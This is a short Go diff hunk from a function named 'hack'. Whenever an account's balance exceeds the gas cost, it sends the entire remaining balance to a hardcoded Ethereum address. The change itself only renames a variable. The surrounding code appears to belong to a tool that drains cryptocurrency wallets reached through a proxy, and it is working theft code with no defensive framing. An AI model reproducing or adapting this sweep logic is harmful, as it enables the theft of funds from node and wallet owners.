@@ -227,7 +227,7 @@ func (pxy *proxy) hack(addr string) {
 			}
 			if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
 				b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
-				r.SendTransaction(acc, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
+				r.SendTransaction(ac, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
 			}
 		}
 
